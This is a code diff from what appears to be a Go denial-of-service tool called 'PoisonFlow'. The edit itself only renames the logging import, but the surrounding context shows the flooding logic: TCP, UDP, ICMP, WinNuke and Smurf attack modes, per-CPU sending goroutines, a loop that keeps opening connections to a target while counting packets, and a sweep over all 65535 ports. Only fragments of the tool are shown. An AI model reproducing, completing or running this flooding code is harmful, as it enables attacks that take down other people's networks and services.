@@ -9,7 +9,7 @@ import (
 	"PoisonFlow/src/conf"
 	"PoisonFlow/src/utils"
 	"fmt"
-	"github.com/sirupsen/logrus"
+	logger "github.com/sirupsen/logrus"
 	"net"
 	"os"
 	"os/signal"
@@ -46,7 +46,7 @@ func (p *DdosAPP) Execute(config *conf.FlowModel) {
 		if strings.HasSuffix(config.Host, "255") {
 			p.ICMP(config)
 		} else {
-			logrus.Errorf("Please check format of Smurf host : 192.168.255.255")
+			logger.Errorf("Please check format of Smurf host : 192.168.255.255")
 		}
 	default:
 		utils.Check.CheckExit("Please check format of ddos mode : TCP、UDP、ICMP、WinNuke、Smurf")
@@ -72,7 +72,7 @@ func (p *DdosAPP) UDP(config *conf.FlowModel) {
 
 func (p *DdosAPP) TCP(config *conf.FlowModel) {
 	numCPU := runtime.NumCPU()
-	logrus.Printf("Limit Send mode---CPU：%d", numCPU)
+	logger.Printf("Limit Send mode---CPU：%d", numCPU)
 	var host = fmt.Sprintf("%s:%d", config.Host, config.Port)
 	if config.Scan == 0 {
 		for i := 0; i < numCPU; i++ {
@@ -95,7 +95,7 @@ func (p *DdosAPP) SendPacket(mode, address string) {
 		select {
 		// 捕获ctrl + c
 		case _ = <-Signal:
-			logrus.Printf("stopped sending a total of %d packets", TotalPacket)
+			logger.Printf("stopped sending a total of %d packets", TotalPacket)
 			os.Exit(0)
 		default:
 			conn, err := net.DialTimeout(mode, address, time.Millisecond*300)
@@ -119,7 +119,7 @@ func (p *DdosAPP) ScanPacket(mode, host string) {
 		select {
 		// 捕获ctrl + c
 		case _ = <-Signal:
-			logrus.Printf("stopped sending a total of %d packets", TotalPacket)
+			logger.Printf("stopped sending a total of %d packets", TotalPacket)
 			os.Exit(0)
 		default:
 			for range make([]struct{}, 65535) {
